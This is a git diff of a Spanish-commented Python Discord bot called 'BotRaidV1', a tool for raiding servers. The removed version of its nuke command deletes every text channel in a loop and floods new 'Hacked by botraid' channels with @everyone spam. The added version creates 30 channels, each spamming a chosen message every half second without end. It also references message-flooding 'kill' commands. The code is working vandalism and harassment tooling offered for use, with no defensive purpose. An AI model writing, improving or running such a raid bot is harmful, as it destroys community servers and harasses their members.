@@ -1,10 +1,12 @@
-#by zvikodev
+import os
 import pyfiglet
 import asyncio
 import discord 
 from discord.ext import commands
+#ARCHIVO DEL TOKEN
 #Activa todos los intents
-text = pyfiglet.figlet_format("zVikoBot")
+os.system('clear')
+text = pyfiglet.figlet_format("BotRaidV1")
 print(text)
 intents = discord.Intents.all()
 #Prefijo del bot
@@ -24,7 +26,7 @@ async def clear(ctx, amount: int = None):
 async def ayuda(ctx):
     embed = discord.Embed(
 title="Menu hecho por zviko",
-description="Use .kill (metodo .kill_speed o .kill_lento y pones lo que quieres enviar) y usa .kill stop_lento para detener y .kill stop_speed) use .nuke para hacer raid",
+description="Use .kill (metodo .kill_speed o .kill_lento y pones lo que quieres enviar) y usa .kill stop_lento para detener y .kill stop_speed",
 color = discord.Color.blue()
 )
     await ctx.send(embed=embed)
@@ -54,44 +56,40 @@ async def kill_lento(ctx, *, mensaje):
 async def stop_lento(ctx):
     global repetir_archivo
     repetir_activo = False
-    await ctx.send("se detuvo el ataque de kill_lento")         
-#3
-
+    await ctx.send("se detuvo el ataque de kill_lento")  
 
 @bot.command()
-async def nuke(ctx):
+async def nuke(ctx, nombre_canal: str, *, mensaje: str):
     if ctx.author.guild_permissions.manage_channels:
-        await ctx.send("Iniciando eliminación y creación de múltiples canales con mensajes repetitivos...")
+        # Mensaje inicial con conteo regresivo
+        mensaje_inicio = await ctx.send("¡Preparando para comenzar en:")
+        await ctx.send("1...", delete_after=3)
+        await asyncio.sleep(1)
+        await ctx.send("2...", delete_after=3)
+        await asyncio.sleep(1)
+        await ctx.send("3...", delete_after=3)
+        await asyncio.sleep(1)
 
-        while True:  # Bucle infinito
-            # Eliminar todos los canales de texto
-            for canal in ctx.guild.text_channels:
-                try:
-                    await canal.delete()  # Elimina el canal
-                    print(f"Canal eliminado: {canal.name}")
-                except Exception as e:
-                    print(f"No se pudo eliminar el canal {canal.name}: {e}")
+        await mensaje_inicio.delete()  # Elimina el mensaje inicial de preparación
 
-            # Lista con los nombres de los canales que quieres crear
-            nombres_canales = ["Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid","Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid", "Hacked by botraid"]
-
-            # Crear nuevos canales
+        # Crear canales y enviar mensajes repetitivos
+        for i in range(30):  # Crear 30 canales
             try:
-                for nombre in nombres_canales:
-                    nuevo_canal = await ctx.guild.create_text_channel(nombre)  # Crear canal con el nombre
-                    print(f"Se creó el canal: {nombre}")
+                nuevo_canal = await ctx.guild.create_text_channel(nombre_canal)  # Crear canal con nombre especificado
+                print(f"Canal creado: {nuevo_canal.name}")
 
-                    # Enviar mensajes repetitivos en el nuevo canal
-                    async def enviar_mensajes(canal):
-                        while True:
-                            await canal.send("@everyone grupo hackeado por botraidv1")  # Mensaje repetitivo
-                            await asyncio.sleep(0.1)  # Espera 5 segundos entre mensajes
+                # Función para enviar mensajes repetitivos
+                async def enviar_mensajes(canal):
+                    while True:
+                        await canal.send(mensaje)  # Enviar mensaje
+                        await asyncio.sleep(0.5)  # Repite cada 0.5 segundos
 
-                    asyncio.create_task(enviar_mensajes(nuevo_canal))  # Ejecutar el bucle de mensajes
+                asyncio.create_task(enviar_mensajes(nuevo_canal))  # Crear la tarea de mensajes repetitivos
             except Exception as e:
-                print(f"No se pudieron crear los nuevos canales: {e}")
+                print(f"No se pudo crear el canal {nombre_canal}: {e}")
 
-            await asyncio.sleep(600)  # Espera 30 segundos antes de repetir el ciclo
+        await ctx.send("¡30 canales creados y mensajes enviados cada 0.5 segundos!")
     else:
         await ctx.send("No tienes permisos suficientes para gestionar canales.")
-bot.run('Token aqui')    
+#poner token aqui 
+bot.run('TOKEN Aqui')    
